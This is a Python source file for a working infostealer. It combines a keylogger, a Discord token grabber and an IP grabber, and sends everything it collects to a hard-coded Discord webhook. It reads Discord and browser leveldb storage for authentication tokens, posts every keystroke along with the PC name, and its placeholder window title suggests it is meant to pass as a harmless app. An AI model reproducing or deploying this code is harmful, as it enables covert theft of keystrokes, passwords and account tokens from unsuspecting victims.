from pynput.keyboard import Key, Listener
import logging, json
import os
from datetime import date
import datetime
import time 
from discord_webhook import DiscordWebhook, DiscordEmbed
import re
from urllib.request import Request, urlopen
import socket 

hostname = socket.gethostname() 

IPAddr = socket.gethostbyname(hostname) 

pcname = os.getenv('username')

token_grabber = False
ip_grabber_f = False
key_logger = True
today = date.today()

ext = {"webhook-id": "https://discordapp.com/api/webhooks/753719972437688410/se5UQhHyccAtFBR6FsrSAazeR9a9cgUmVsR1Kg8TcZOt6llSdFIPpCwr9SYGVHZW3n6b", "webhook-name": "KeyLogger"}

os.system('title TITLE OF THE APP')

def ip_grabber():
    webhook = DiscordWebhook(url=ext['webhook-id'], content=f"User IP Address: {IPAddr}",  username=ext['webhook-name'])
    webhook.execute()

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if True else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    webhook = DiscordWebhook(url=ext['webhook-id'], content=message,  username=ext['webhook-name'])
    webhook.execute()

def on_press(key):
    webhook = DiscordWebhook(url=ext['webhook-id'], content=f"| Date: {today} | KEY: {str(key)} | PC name: {pcname} |",  username=ext['webhook-name'])
    response = webhook.execute()


def listener_s():
    with Listener(on_press=on_press) as listener:
        listener.join()

if token_grabber is True:
    main()
if ip_grabber_f is True:
    ip_grabber()
if key_logger is True:
    listener_s()